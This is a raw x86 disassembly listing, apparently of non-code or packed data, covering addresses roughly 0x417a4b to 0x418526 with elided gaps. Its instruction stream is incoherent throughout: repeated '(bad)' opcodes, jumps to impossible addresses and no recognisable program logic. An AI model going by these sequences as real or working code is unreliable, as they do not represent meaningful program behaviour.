  417a4b:	pop    ecx
  417a4c:	and    dl,ch
  417a4e:	std    
  417a4f:	fs mov dl,dl
  417a52:	push   eax
  417a53:	dec    esi
	...
  417a7c:	add    BYTE PTR [eax],al
  417a7e:	nop
  417a7f:	data16 std 
  417a81:	mov    esp,0xdbe1c341
  417a86:	cmp    eax,0x4229095b
  417a8b:	loopne 0x417a13
  417a8d:	jmp    0xad06d5cf
  417a92:	push   ebp
  417a93:	(bad)  
  417a94:	std    
  417a95:	jmp    0x1d8518d7
  417a9a:	push   edx
  417a9b:	pop    ebp
  417a9c:	add    cl,ch
  417a9e:	xlat   BYTE PTR ds:[ebx]
  417a9f:	aad    0x67
  417aa1:	jmp    0xe9a9504d
  417aa6:	mov    eax,0xc099f41e
  417aab:	fdivrp st(4),st
  417aad:	imul   BYTE PTR ds:0x97e650d5
  417ab3:	int    0xfd
  417ab5:	push   esp
  417ab6:	push   cs
  417ab7:	mov    esi,0x5b3dfbb3
  417abc:	or     DWORD PTR [ecx+0x35e95b86],ebp
  417ac2:	fcmovu st,st(7)
  417ac4:	dec    eax
  417ac5:	sub    BYTE PTR [edx],bh
  417ac7:	(bad)  
  417ac8:	jae    0x417aa3
  417aca:	inc    ebp
  417acb:	arpl   WORD PTR [edx],bp
  417acd:	scas   al,BYTE PTR es:[edi]
  417ace:	ins    DWORD PTR es:[edi],dx
  417acf:	loope  0x417aa1
  417ad1:	je     0x417a9a
  417ad3:	leave  
  417ad4:	cmc    
  417ad5:	sahf   
  417ad6:	dec    ebp
  417ad7:	es push edx
  417ad9:	cmp    DWORD PTR [ebx+eax*4-0x3],0x144f4d8e
	...
  417b09:	add    BYTE PTR [eax],al
  417b0b:	add    BYTE PTR [edi+0x77],dl
  417b0e:	inc    esp
  417b0f:	sub    dh,al
  417b11:	mov    DWORD PTR [eax-0x16e187b],ecx
  417b17:	call   eax
  417b19:	push   ebx
  417b1a:	in     eax,dx
  417b1b:	mul    eax
  417b1d:	mov    esi,edi
  417b1f:	jne    0x417b84
  417b21:	mov    BYTE PTR [eax+ecx*1-0x1],dh
  417b25:	sub    eax,0x89f0fffb
  417b2a:	mov    ah,0xf0
  417b2c:	js     0x417ab6
  417b2e:	(bad)  
  417b2f:	call   0x403e6b
  417b34:	jo     0x417ad8
  417b36:	cmc    
  417b37:	jmp    0x417ad7
  417b39:	mov    BYTE PTR [esp+edi*8+0x2f],dh
  417b3d:	cwde   
  417b3e:	verr   WORD PTR [edi]
  417b41:	cwde   
  417b42:	mov    edi,0x8ab41710
  417b47:	in     al,dx
  417b48:	xchg   esp,eax
  417b49:	and    edx,DWORD PTR [ecx+0xa124057]
  417b4f:	call   0x404e1a
  417b54:	fcomp  QWORD PTR [eax]
  417b56:	je     0x417b5d
  417b58:	mov    al,0x97
  417b5a:	mov    edi,0x4457e71c
  417b5f:	xchg   esp,eax
  417b60:	dec    esp
  417b61:	or     ebx,DWORD PTR [edx]
  417b63:	pop    gs
  417b65:	mov    eax,ds:0x52e0500e
  417b6a:	inc    esi
  417b6b:	push   cs
  417b6c:	push   edi
  417b6d:	pop    eax
  417b6e:	mov    dh,0x47
	...
  417b98:	add    BYTE PTR [eax],al
  417b9a:	mov    ds:0x58b60ea8,al
  417b9f:	pop    ebx
  417ba0:	push   eax
  417ba1:	movaps XMMWORD PTR [ecx+0x5290500a],xmm4
  417ba8:	inc    esi
  417ba9:	or     dl,BYTE PTR [edi+0x58]
  417bac:	mov    dh,0x47
  417bae:	ds mov ebx,0x7dc80ed1
  417bb4:	cld    
  417bb5:	dec    edi
  417bb6:	dec    ecx
  417bb7:	xchg   ebp,eax
  417bb8:	retf   0xe05
  417bbb:	lds    edi,FWORD PTR [edx+0x46]
  417bbe:	inc    edx
  417bbf:	jb     0x417bf2
  417bc1:	ss (bad) 
  417bc3:	push   DWORD PTR [eax+eax*2-0x6437b0c2]
  417bca:	out    dx,al
  417bcb:	sub    DWORD PTR [eax+edx*1+0x3e],ecx
  417bcf:	ret    0xc386
  417bd2:	or     al,BYTE PTR [ecx-0x50]
  417bd5:	pop    ds
  417bd6:	ds push ss
  417bd8:	mov    ebp,0x32aeabfe
  417bdd:	je     0x417c2d
  417bdf:	sbb    al,BYTE PTR [eax]
  417be1:	and    DWORD PTR ss:[ebp-0x176d4002],eax
  417be8:	jl     0x417c2e
  417bea:	mov    dh,0x74
  417bec:	mov    eax,0x9f70907
  417bf1:	call   0xfe741c6a
  417bf6:	stc    
  417bf7:	push   esi
  417bf8:	xchg   ebp,eax
  417bf9:	(bad)  
  417bfa:	imul   edi,DWORD PTR [edx+0xa019],0x0
	...
  417c25:	add    BYTE PTR [eax],al
  417c27:	add    BYTE PTR [ecx*8+0x267b8c2f],bl
  417c2e:	sar    esi,1
  417c30:	push   ebx
  417c31:	pop    edx
  417c32:	sbb    al,0x94
  417c34:	sbb    al,0xb5
  417c36:	das    
  417c37:	(bad)  
  417c38:	push   ebx
  417c39:	dec    edx
  417c3a:	das    
  417c3b:	je     0x417c63
  417c3d:	call   0x742f:0x9cb9217e
  417c44:	(bad)  
  417c45:	test   eax,0xca9249f
  417c4a:	sbb    al,0x2f
  417c4c:	mov    eax,ds:0x13fefc8e
  417c51:	pop    ebx
  417c52:	call   FWORD PTR [ebx]
  417c54:	sub    al,0x79
  417c56:	sahf   
  417c57:	xor    DWORD PTR [eax+0xa317b4d],ecx
  417c5d:	jae    0x417cde
  417c5f:	sahf   
  417c60:	pop    ds
  417c61:	aam    0x86
  417c63:	jg     0x417c5f
  417c65:	not    BYTE PTR [edi]
  417c67:	xor    edx,esi
  417c69:	jb     0x417cea
  417c6b:	rcr    BYTE PTR [edi],cl
  417c6d:	aam    0x6e
  417c6f:	xor    edx,edx
  417c71:	outs   dx,BYTE PTR ds:[esi]
  417c72:	data16 mov bh,0x41
  417c75:	aam    0xd4
  417c77:	or     edx,DWORD PTR [esi+0x7e]
  417c7a:	or     DWORD PTR [ecx],esi
  417c7c:	inc    eax
  417c7d:	rcl    esp,cl
  417c7f:	xchg   edi,eax
  417c80:	and    DWORD PTR [ecx+0x3330310c],ecx
  417c86:	xor    BYTE PTR [esi+0x45],al
  417c89:	pop    ebx
  417c8a:	pushf  
  417c8b:	jl     0x417c8d
	...
  417cb5:	add    BYTE PTR ds:0xc2823dd,dl
  417cbb:	shl    DWORD PTR [esi],cl
  417cbd:	xor    DWORD PTR [edx+0x9876c73],ecx
  417cc3:	xlat   BYTE PTR ds:[ebx]
  417cc4:	push   ss
  417cc5:	xor    DWORD PTR [ecx-0x2e],esi
  417cc8:	xchg   esp,eax
  417cc9:	sti    
  417cca:	loope  0x417cff
  417ccc:	push   esp
  417ccd:	xor    eax,esi
  417ccf:	shl    BYTE PTR [ebx+ecx*1-0x45],cl
  417cd3:	fsub   st,st(7)
  417cd5:	sub    esp,eax
  417cd7:	rcl    BYTE PTR [edi-0x19a0add0],cl
  417cdd:	mov    dh,0x39
  417cdf:	ret    
  417ce0:	ins    DWORD PTR es:[edi],dx
  417ce1:	pop    esi
  417ce2:	enter  0x41d2,0x4
  417ce6:	push   esp
  417ce7:	pop    ebx
  417ce8:	aas    
  417ce9:	xor    DWORD PTR [ebx+ebx*2],edi
  417cec:	out    0x7e,eax
  417cee:	mov    edx,0xa830b35b
  417cf3:	sub    eax,DWORD PTR [eax]
  417cf5:	inc    ebx
  417cf6:	outs   dx,DWORD PTR ds:[esi]
  417cf7:	shl    DWORD PTR [ebx-0x27],1
  417cfa:	mov    ebx,0x35e967d2
  417cff:	test   BYTE PTR [eax],dl
  417d01:	jmp    0x99c51743
  417d06:	dec    edx
  417d07:	sar    ebp,1
  417d09:	stc    
  417d0a:	cmp    eax,0xb8ae005b
  417d0f:	into   
  417d10:	icebp  
  417d11:	jle    0x417d41
  417d13:	pop    esp
  417d14:	add    cl,ch
  417d16:	cmp    eax,0x71839a
	...
  417d43:	add    BYTE PTR [edx],dl
  417d45:	sar    ebp,1
  417d47:	jmp    0x2641d889
  417d4c:	rcl    dh,0xf1
  417d4f:	push   esi
  417d50:	push   cs
  417d51:	sar    ch,cl
  417d53:	jmp    0xe1956395
  417d58:	mov    dl,0x6c
  417d5a:	push   0xffffffe9
  417d5c:	test   al,0xd7
  417d5e:	lock cmp ch,BYTE PTR [esi-0x2f]
  417d62:	push   eax
  417d63:	pop    esp
  417d64:	rol    ch,0xf1
  417d67:	es dec esi
  417d69:	and    cl,BYTE PTR [ebx-0x232da9c]
  417d6f:	push   ss
  417d70:	in     eax,dx
  417d71:	shl    BYTE PTR [ebx-0x7],1
  417d74:	cs inc edi
  417d76:	or     al,0x6
  417d78:	test   al,0x59
  417d7a:	push   0xffffffe9
  417d7c:	cs inc edi
  417d7e:	sbb    dh,dh
  417d80:	or     bl,BYTE PTR [esi]
  417d82:	sub    DWORD PTR [esi*1+0x3ae6fdcd],0x42d48462
  417d8d:	pop    ebx
  417d8e:	add    BYTE PTR [edx+0x4f],ch
  417d91:	(bad)  
  417d92:	icebp  
  417d93:	into   
  417d94:	imul   edx,edx,0x6f23000e
  417d9a:	std    
  417d9b:	call   DWORD PTR [edi+0x56715df5]
  417da1:	push   edi
  417da2:	mov    eax,DWORD PTR [ebp-0x17e59]
	...
  417dd0:	add    BYTE PTR [eax],al
  417dd2:	push   edi
  417dd3:	outs   dx,DWORD PTR ds:[esi]
  417dd4:	xlat   BYTE PTR ds:[ebx]
  417dd5:	seta   BYTE PTR [ebp-0x7d]
  417dd9:	shl    BYTE PTR [ebx],0x60
  417ddc:	push   0xfd98566f
  417de1:	mov    edx,fs
  417de3:	push   esi
  417de4:	cld    
  417de5:	(bad)  
  417de6:	call   0x59076391
  417deb:	pop    ebp
  417dec:	add    BYTE PTR [ebp-0x507b2e59],al
  417df2:	addr16 pop ebp
  417df4:	add    bh,al
  417df6:	loop   0x417d7a
  417df8:	repnz (bad) 
  417dfa:	call   0xca307e62
  417dff:	out    dx,eax
  417e00:	jp     0x417e73
  417e02:	out    0x5c,al
  417e04:	mov    eax,DWORD PTR [ebp-0x17ae9]
  417e0a:	(bad)  
  417e0b:	je     0x417dac
  417e0d:	(bad)  
  417e0f:	pop    ebp
  417e10:	add    eax,0xffffffb3
  417e13:	mov    esi,0x8c4385c6
  417e18:	(bad)  
  417e19:	call   DWORD PTR [ecx]
  417e1b:	pop    ebp
  417e1c:	in     eax,dx
  417e1d:	mov    esi,0x4170f3bf
  417e22:	out    0xdb,eax
  417e24:	test   BYTE PTR [eax],al
  417e26:	aas    
  417e27:	cmp    dh,0x50
  417e2a:	aas    
  417e2b:	fmul   QWORD PTR [esi]
  417e2d:	add    bh,ah
  417e2f:	jecxz  0x417dee
  417e31:	je     0x417e6b
  417e33:	sbb    BYTE PTR [esp+eiz*8+0x0],al
	...
  417e5e:	add    BYTE PTR [eax],al
  417e60:	in     al,0x81
  417e62:	inc    BYTE PTR [edi]
  417e64:	ds ret 0xbd1e
  417e68:	es jmp 0x477fbf22
  417e6e:	mov    bh,bh
  417e70:	mov    cl,0x11
  417e72:	das    
  417e73:	dec    edi
  417e74:	xchg   esi,eax
  417e75:	push   ds
  417e76:	std    
  417e77:	call   FWORD PTR [ecx-0x138bbec9]
  417e7d:	inc    edx
  417e7e:	jo     0x417e63
  417e80:	(bad)  
  417e81:	icebp  
  417e82:	cs push es
  417e84:	fldcw  WORD PTR ds:[ebx+0x74]
  417e88:	and    bl,BYTE PTR [esp+eax*1-0x1]
  417e8c:	jmp    0x417e53
  417e8e:	cs je  0x417ee3
  417e91:	push   ecx
  417e92:	js     0x417e7b
  417e94:	ins    DWORD PTR es:[edi],dx
  417e95:	dec    ecx
  417e96:	cs (bad) 
  417e98:	xchg   ebx,eax
  417e99:	dec    esi
  417e9a:	xor    bh,dh
  417e9c:	push   ecx
  417e9d:	cmp    DWORD PTR [eax+0x25e7490f],edi
  417ea3:	repnz inc ecx
  417ea5:	sub    DWORD PTR [ecx],ebx
  417ea7:	call   0xac5c:0xea2e213b
  417eae:	add    al,0xff
  417eb0:	mov    bl,0xbe
  417eb2:	cs je  0x417eff
  417eb5:	mov    DWORD PTR [eax-0x19],edi
  417eb8:	or     eax,0xcbfe2e81
  417ebd:	gs xor bh,dh
  417ec0:	or     DWORD PTR [ecx-0x48],esi
  417ec3:	sldt   WORD PTR [eax]
	...
  417eee:	add    DWORD PTR [edi],ebp
  417ef0:	and    eax,0x1960f9f2
  417ef5:	jbe    0x417eea
  417ef7:	pop    eax
  417ef8:	cs (bad) 
  417efa:	mov    bl,0x5d
  417efc:	xor    bh,dh
  417efe:	loope  0x417f59
  417f00:	xchg   edx,eax
  417f01:	push   cs
  417f02:	ds ret 0xc13c
  417f06:	sub    bl,BYTE PTR [ebx-0x19]
  417f09:	(bad)  
  417f0a:	mov    ah,0xbe
  417f0c:	push   0x48
  417f0e:	vunpcklps xmm2,xmm4,XMMWORD PTR [eax+0x3e71a04]
  417f16:	sub    dl,BYTE PTR [eax+0x5aa5c7ae]
  417f1c:	out    0x3,eax
  417f1e:	test   BYTE PTR ds:[edi+0x5c2b09d4],ah
  417f25:	xlat   BYTE PTR ds:[ebx]
  417f26:	xchg   ebp,eax
  417f27:	sub    al,0xa6
  417f29:	pop    ss
  417f2a:	stos   BYTE PTR es:[edi],al
  417f2b:	and    ebp,DWORD PTR [eax]
  417f2d:	add    al,0xbb
  417f2f:	call   0xaf6a:0x7b650210
  417f36:	jne    0x417f92
  417f38:	cld    
  417f39:	add    DWORD PTR [ebp+0x73],edx
  417f3c:	lfs    ebp,FWORD PTR [edx+ebx*1-0x19]
  417f41:	sub    al,0xd2
  417f43:	into   
  417f44:	outs   dx,BYTE PTR ds:[esi]
  417f45:	mov    bh,0x39
  417f47:	ret    
  417f48:	and    ebx,DWORD PTR [edi+0x48]
  417f4b:	iret   
  417f4c:	jb     0x417f25
  417f4e:	inc    ebp
  417f4f:	jecxz  0x417f4a
  417f51:	sub    al,0x0
	...
  417f7b:	add    BYTE PTR [edx+0x39d24ecf],dh
  417f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f82:	sub    DWORD PTR [eax],ecx
  417f84:	sub    BYTE PTR ds:[edx+0x20],dh
  417f88:	mov    esp,0x199a3397
  417f8d:	inc    ebp
  417f8e:	lea    ebp,[edx+ecx*4]
  417f91:	arpl   WORD PTR [edi],cx
  417f93:	leave  
  417f94:	sub    esi,ecx
  417f96:	push   ds
  417f97:	jnp    0x418013
  417f99:	iret   
  417f9a:	push   ss
  417f9b:	mov    bh,0x41
  417f9d:	ret    
  417f9e:	js     0x417fcd
  417fa0:	lock into 
  417fa2:	(bad)  
  417fa3:	push   eax
  417fa4:	pop    eax
  417fa5:	sbb    al,0xe7
  417fa7:	sub    al,0x2a
  417fa9:	add    DWORD PTR [ecx],eax
  417fab:	mov    eax,ds:0x74fecefc
  417fb0:	aad    0xb6
  417fb2:	fwait
  417fb3:	loop   0x417fcf
  417fb5:	int    0x68
  417fb7:	mov    edx,0x41001ba2
  417fbc:	rcl    BYTE PTR [esi],0x3f
  417fbf:	jmp    0xc6686719
  417fc4:	pop    edx
  417fc5:	push   ds
  417fc6:	push   eax
  417fc7:	push   ecx
  417fc8:	mov    ds:0x6ae93f3e,al
  417fcd:	xchg   DWORD PTR [edx-0x13182df],ebp
  417fd3:	sbb    al,0x8a
  417fd5:	mov    dh,0x18
  417fd7:	popf   
  417fd8:	push   edx
  417fd9:	int    0xe8
  417fdb:	mov    ch,0x5f
  417fdd:	int    0xfd
  417fdf:	add    eax,DWORD PTR [eax]
	...
  418009:	add    BYTE PTR [edx],bh
  41800b:	inc    ebx
  41800c:	dec    esi
  41800d:	clc    
  41800e:	jl     0x417fde
  418010:	gs retf 
  418012:	lods   al,BYTE PTR ds:[esi]
  418013:	sbb    eax,DWORD PTR [eax]
  418015:	add    DWORD PTR [ebx+ebx*2],edi
  418018:	add    BYTE PTR [ecx+0x35],ch
  41801b:	mov    al,0x23
  41801d:	data16 sbb ah,BYTE PTR [ecx-0x40]
  418021:	aad    0x5d
  418023:	ss push esi
  418025:	fdivr  st,st(4)
  418027:	int    0x4d
  418029:	inc    ecx
  41802a:	xchg   edi,eax
  41802b:	js     0x41802a
  41802d:	inc    esi
  41802e:	or     eax,0x87f4fd1e
  418033:	push   ss
  418034:	aas    
  418035:	jmp    0x4149c7a4
  41803a:	and    dl,cl
  41803c:	std    
  41803d:	es and eax,0x521e22fc
  418043:	adc    DWORD PTR ss:[ecx-0x2b013204],ebx
  41804a:	xchg   edi,eax
  41804b:	push   ss
  41804c:	aas    
  41804d:	add    bh,dl
  41804f:	jle    0x4180c5
  418051:	or     BYTE PTR [edi-0x49],cl
  418054:	cli    
  418055:	call   eax
  418057:	repnz std 
  418059:	addr16 mov ch,0x9
  41805c:	inc    ecx
  41805d:	add    al,ah
  41805f:	retf   
  418060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418061:	dec    eax
  418062:	push   ss
  418063:	push   edi
  418064:	std    
  418065:	jne    0x418006
  418067:	jno    0x418019
  418069:	sti    
  41806a:	add    BYTE PTR [ecx+0x67],0x0
	...
  418095:	add    BYTE PTR [eax],al
  418097:	add    BYTE PTR [edi],cl
  418099:	(bad)  
  41809a:	ins    DWORD PTR es:[edi],dx
  41809b:	inc    ecx
  41809c:	xchg   edi,eax
  41809d:	xor    BYTE PTR [edx+ebp*4],0x5f
  4180a1:	cwde   
  4180a2:	std    
  4180a3:	dec    BYTE PTR [edx-0x31]
  4180a6:	in     eax,0x9c
  4180a8:	fadd   QWORD PTR [ecx-0x7cd50002]
  4180ae:	(bad)  
  4180af:	jne    0x418110
  4180b1:	jno    0x418088
  4180b3:	pop    ds
  4180b4:	rol    BYTE PTR [ecx+0x595bc2c8],0x53
  4180bb:	mov    esi,DWORD PTR [ebx-0x2e0b3e29]
  4180c1:	cmp    esi,0x5eef676a
  4180c7:	jmp    FWORD PTR [edx-0x2f]
  4180ca:	in     eax,0x79
  4180cc:	inc    eax
  4180cd:	cmp    dh,0x89
  4180d0:	jmp    0x40f9:0x1605c674
  4180d7:	add    BYTE PTR ds:0x92000059,dl
  4180dd:	(bad)  
  4180df:	(bad)  
  4180e0:	push   eax
  4180e1:	or     BYTE PTR [ebp+0x68],0x1b
  4180e5:	pop    eax
  4180e6:	add    BYTE PTR [eax],al
  4180e8:	das    
  4180e9:	je     0x4180f7
  4180eb:	add    BYTE PTR [edi],dl
  4180ed:	icebp  
  4180ee:	add    BYTE PTR [edx+0x3e],dh
  4180f1:	add    eax,DWORD PTR [edx]
  4180f3:	push   0xffc4f3eb
  4180f8:	popa   
  4180f9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180fb:	inc    eax
	...
  418124:	add    BYTE PTR [eax],al
  418126:	ds int 0xf0
  418129:	test   eax,0xff020386
  41812e:	dec    ebx
  41812f:	mov    edx,0xb59ddb19
  418134:	sub    ah,BYTE PTR [edi+0x3f]
  418137:	xor    bl,al
  418139:	jmp    DWORD PTR [ecx]
  41813b:	scas   eax,DWORD PTR es:[edi]
  41813c:	mov    ah,0x40
  41813e:	ds sbb dl,dh
  418141:	pusha  
  418142:	inc    ecx
  418144:	cdq    
  418145:	add    DWORD PTR [esi],edi
  418147:	ret    0xfe81
  41814a:	adc    edi,DWORD PTR [edx-0x22240e7]
  418150:	sub    cl,BYTE PTR [ebx+eax*8-0x7e01d813]
  418157:	xchg   edx,eax
  418158:	sbb    al,0x8b
  41815a:	dec    ebx
  41815b:	ret    0xc701
  41815e:	cmp    esi,DWORD PTR [ebx-0x5c]
  418161:	inc    eax
  418162:	rol    DWORD PTR ds:[ecx],0x0
  418166:	ds aas 
  418168:	xor    dh,0x58
  41816b:	inc    ebp
  41816c:	sub    cl,BYTE PTR [edi-0x1a]
  41816f:	mov    ch,0x4
  418171:	add    BYTE PTR [esi],bh
  418173:	sub    al,BYTE PTR [esi-0x663dc1f4]
  418179:	add    BYTE PTR [ebx+eax*1-0x4cd497fe],ch
  418180:	(bad)  
  418181:	jmp    DWORD PTR [ecx+0x3e40a4f0]
  418187:	(bad)  
  418188:	lock test eax,0x0
	...
  4181b2:	add    BYTE PTR [eax],al
  4181b4:	xchg   BYTE PTR [ebx],al
  4181b6:	add    bh,bh
  4181b8:	mov    edi,DWORD PTR [edx+0x5add7b19]
  4181be:	sub    bl,BYTE PTR es:[ecx-0x63b66a6]
  4181c5:	xor    ebx,DWORD PTR [esp+esi*4]
  4181c8:	jle    0x418225
  4181ca:	jg     0x4181a1
  4181cc:	pop    esi
  4181cd:	sbb    ah,bh
  4181cf:	fwait
  4181d0:	aas    
  4181d1:	pop    ebx
  4181d2:	out    0x83,eax
  4181d4:	fadd   DWORD PTR [ebp-0x21]
  4181d7:	sbb    esi,DWORD PTR [ecx-0x8]
  4181da:	out    dx,al
  4181db:	sub    DWORD PTR [edx-0x3fd5212b],edi
  4181e1:	retf   
  4181e2:	aaa    
  4181e3:	sbb    al,0x65
  4181e5:	pop    esi
  4181e6:	out    0x3,eax
  4181e8:	mov    cl,0x45
  4181ea:	retf   
  4181eb:	sub    DWORD PTR [edx],esi
  4181ed:	arpl   di,cx
  4181ef:	xor    eax,DWORD PTR [ebx-0x34]
  4181f2:	mov    esi,0xe7567f3b
  4181f7:	into   
  4181f8:	les    edi,FWORD PTR [esi+0x2385406a]
  4181fe:	aaa    
  4181ff:	int3   
  418200:	sbb    DWORD PTR [edi],edx
  418202:	xchg   esi,eax
  418203:	les    edi,FWORD PTR [ecx-0x3d]
  418206:	sbb    DWORD PTR [ebx],eax
  418208:	jge    0x4181d5
  41820a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41820b:	mov    edi,0x3e75a65
  418210:	ds or  al,0xee
  418213:	mov    ch,0xfe
  418215:	pop    edx
  418216:	jbe    0x4181c7
	...
  418240:	add    BYTE PTR [eax],al
  418242:	cmp    esp,ebx
  418244:	in     al,0x91
  418246:	int3   
  418247:	sbb    edi,esp
  418249:	lahf   
  41824a:	sahf   
  41824b:	mov    ah,bh
  41824d:	add    edi,DWORD PTR [esi]
  41824f:	fcmovne st,st(7)
  418251:	add    eax,0x28df4f3e
  418256:	mov    dl,0x53
  418258:	dec    edi
  418259:	jbe    0x4182a4
  41825b:	retf   0x1b3e
  41825e:	rcr    DWORD PTR [ebx+0x0],1
  418261:	jmp    0x41c35a3
  418266:	push   edi
  418267:	leave  
  418268:	std    
  418269:	pushf  
  41826a:	add    eax,0x26fc89c3
  41826f:	leave  
  418270:	mov    eax,ds:0x1bab7b
  418275:	test   DWORD PTR [esi],edx
  418277:	pop    DWORD PTR [eax]
  418279:	jmp    0x25caddbb
  41827e:	sahf   
  41827f:	leave  
  418280:	xor    ebp,ecx
  418282:	cmp    eax,0xed94005b
  418287:	inc    edx
  418288:	and    cl,ah
  41828a:	std    
  41828b:	retf   0xc065
  41828e:	outs   dx,BYTE PTR ds:[esi]
  41828f:	mov    al,BYTE PTR [eax]
  418291:	cmp    esi,ebx
  418293:	shl    DWORD PTR [ebx],cl
  418295:	jmp    0xc641ddd7
  41829a:	shl    BYTE PTR [edx-0x3],1
  41829d:	(bad)  
  41829e:	mov    esp,0x7a2d3e89
  4182a3:	retf   0xce71
	...
  4182ce:	add    BYTE PTR [eax],al
  4182d0:	ret    0x10d2
  4182d3:	sbb    eax,0x9d43a185
  4182d8:	cmp    al,0x5b
  4182da:	add    cl,ch
  4182dc:	push   edx
  4182dd:	imul   edi,ebp,0xffffffd4
  4182e0:	ror    DWORD PTR [ebp+0x3f],cl
  4182e3:	jmp    0xfad811fe
  4182e8:	jl     0x4182b4
  4182ea:	in     eax,0x7d
  4182ec:	inc    ebx
  4182ed:	retf   0x6afd
  4182f0:	or     DWORD PTR [edx-0x17],esi
  4182f3:	scas   al,BYTE PTR es:[edi]
  4182f4:	jo     0x4182cb
  4182f6:	in     al,dx
  4182f7:	jb     0x418301
  4182f9:	push   esi
  4182fa:	mov    DWORD PTR [ebp+ecx*2-0x591e8d36],ebp
  418301:	dec    edx
  418302:	mov    eax,0x5e1700
  418307:	call   ebp
  418309:	ror    DWORD PTR [esi+0x5e6380],1
  41830f:	add    BYTE PTR [eax+0x10],bl
  418312:	push   cs
  418313:	(bad)  
  418314:	xchg   edi,eax
  418315:	cmp    bh,ch
  418317:	jmp    edi
  418319:	fidivr WORD PTR [esi+edx*4]
  41831c:	aam    0x9c
  41831e:	std    
  41831f:	call   ebx
  418321:	ins    BYTE PTR es:[edi],dx
  418322:	std    
  418323:	xor    eax,0x410f85
  418328:	fdiv   DWORD PTR [edi+0x5da67393]
  41832e:	call   0xfeb470e4
  418333:	mov    eax,0x0
	...
  41835c:	add    BYTE PTR [eax],al
  41835e:	xlat   BYTE PTR ds:[ebx]
  41835f:	pop    ebp
  418360:	add    BYTE PTR [eax],al
  418362:	jp     0x418381
  418364:	and    DWORD PTR [eax],eax
  418366:	add    edx,DWORD PTR [edx+0x4]
  418369:	add    BYTE PTR [edi-0x2f7cffa3],dl
  41836f:	pop    edx
  418370:	cmp    DWORD PTR [edi],0x3f84d0a7
  418376:	enter  0xfe81,0x8b
  41837a:	bound  esi,QWORD PTR [ebx+0x5e]
  41837d:	leave  
  41837e:	aad    0x5a
  418380:	add    BYTE PTR [ebp-0x14],dl
  418383:	bound  eax,QWORD PTR [edx+0x4d98cbc4]
  418389:	pop    eax
  41838a:	aas    
  41838b:	adc    esi,esi
  41838d:	inc    eax
  41838e:	push   edi
  41838f:	jne    0x418400
  418391:	add    DWORD PTR [ecx+eax*4-0x78233676],esp
  418398:	sub    dh,dh
  41839a:	fadd   QWORD PTR [edi-0x4487059b]
  4183a0:	add    BYTE PTR [ebx-0x3bbaf92],cl
  4183a6:	ds cmp eax,0x3d44ea3b
  4183ac:	cmp    eax,DWORD PTR [edx]
  4183ae:	clc    
  4183af:	dec    ebp
  4183b0:	cmp    ecx,DWORD PTR [edi-0x3b]
  4183b3:	mov    ebx,DWORD PTR [edi+edi*8]
  4183b6:	inc    ebp
  4183b7:	mov    dl,0x1
  4183b9:	mov    esi,edi
  4183bb:	jmp    0xc879:0x743dc87a
	...
  4183ea:	add    BYTE PTR [eax],al
  4183ec:	stc    
  4183ed:	mul    DWORD PTR ds:0x46e7382
  4183f3:	jne    0x4183d3
  4183f5:	clc    
  4183f6:	cmp    al,0xc2
  4183f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4183fb:	dec    edi
  4183fc:	jbe    0x4183e8
  4183fe:	mov    esi,edi
  418400:	jle    0x4183b4
  418402:	sub    DWORD PTR [ecx+0x3f],esi
  418405:	jne    0x41842c
  418407:	mov    bh,BYTE PTR [ebx-0x36]
  41840a:	cli    
  41840b:	mov    edi,0x41ab632
  418410:	mov    al,0xba
  418412:	and    eax,DWORD PTR [edi]
  418414:	(bad)  
  418415:	xor    ecx,ebp
  418417:	jmp    FWORD PTR [edx]
  418419:	or     BYTE PTR ds:0xd0b242c1,bh
  41841f:	mov    ah,BYTE PTR [edx-0x120cc2cb]
  418425:	popa   
  418426:	int3   
  418427:	addr16 jle 0x418424
  41842a:	sar    edi,0x71
  41842d:	fs add eax,ebx
  418430:	jno    0x41842b
  418432:	shl    bl,0x3e
  418435:	mov    dl,0x1
  418437:	add    BYTE PTR ds:0x5a4478fd,dl
  41843d:	bound  esp,QWORD PTR ds:0x3eda4674
  418443:	or     bh,BYTE PTR [esi]
  418445:	mov    dl,0x80
  418447:	mov    edi,0x271c5ac6
  41844c:	mov    dl,0x53
  41844e:	dec    edi
  41844f:	mov    al,BYTE PTR [eax]
	...
  418479:	add    BYTE PTR [eax-0x38],cl
  41847c:	push   esi
  41847d:	jl     0x418401
  41847f:	ret    
  418480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418481:	rcr    DWORD PTR [ecx],cl
  418483:	xchg   edi,eax
  418484:	out    0x26,al
  418486:	sbb    dl,dl
  418488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418489:	das    
  41848a:	adc    BYTE PTR [esi+0x33],cl
  41848d:	sbb    eax,ebx
  41848f:	push   esp
  418490:	out    0x3,eax
  418492:	xor    eax,0xf90f9b9b
  418497:	dec    ebp
  418498:	pop    ds
  418499:	es push 0xffffffcf
  41849c:	mov    bh,0x1b
  41849e:	loope  0x418507
  4184a0:	push   cs
  4184a1:	es loopne 0x4184f1
  4184a4:	add    ebx,DWORD PTR [ebx]
  4184a6:	dec    ebp
  4184a7:	push   ebp
  4184a8:	out    0x3,eax
  4184aa:	ror    DWORD PTR [ebp-0x21],1
  4184ad:	sbb    ecx,DWORD PTR [ebp+0x62]
  4184b0:	out    dx,al
  4184b1:	and    eax,0x4db45bc
  4184b6:	xor    ch,BYTE PTR [ecx+0x4f]
  4184b9:	push   esi
  4184ba:	sub    al,0x1a
  4184bc:	out    0x24,eax
  4184be:	xor    cl,bh
  4184c0:	mov    edi,0xe75b3419
  4184c5:	clc    
  4184c6:	(bad)  [esi-0x1c]
  4184c9:	push   0x3e75b3e
  4184ce:	mov    DWORD PTR [ebp-0x4d],ecx
  4184d1:	sbb    al,0x1b
  4184d3:	push   0x9bc425a6
  4184d8:	inc    edx
  4184d9:	cmp    edi,DWORD PTR [edi+0x5e]
  4184dc:	out    0xce,eax
	...
  418506:	add    BYTE PTR [eax],al
  418508:	mov    ah,0xb6
  41850a:	aaa    
  41850b:	int3   
  41850c:	fldcw  WORD PTR [edx]
  41850e:	add    ah,0x59
  418511:	iret   
  418512:	stc    
  418513:	add    bh,BYTE PTR [ebp-0x39]
  418516:	add    BYTE PTR [esi-0x67],dh
  418519:	pop    edi
  41851a:	call   0xfe09ba57
  41851f:	shl    DWORD PTR ds:0xfca6fb3f,cl
  418525:	(bad)  
  418526:	(bad)  
